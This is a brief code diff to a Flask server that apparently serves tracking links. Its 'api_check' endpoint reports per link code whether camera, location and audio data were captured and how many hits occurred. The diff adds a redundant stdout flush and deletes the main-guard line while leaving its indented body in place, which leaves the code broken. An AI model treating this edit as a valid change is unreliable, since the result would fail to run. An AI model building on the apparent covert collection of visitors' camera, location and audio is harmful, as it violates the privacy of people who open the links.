@@ -1,4 +1,6 @@
 from flask import Flask, render_template, request, jsonify
+import sys
+sys.stdout.flush()
 from flask_cors import CORS
 import os, json, threading, time, sys
 from config import BASE_URL, PORT
@@ -108,7 +110,6 @@ def api_check(code):
     if not v: return jsonify({'exists':False}), 404
     return jsonify({'exists':True,'camera':bool(v['camera_data']),'location':bool(v['location_data']),'audio':bool(v['audio_data']),'hits':v['access_count']})
 
-if __name__ == '__main__':
     print("Starting server...", flush=True)
     start_bot()
     app.run(host='0.0.0.0', port=PORT, debug=False)
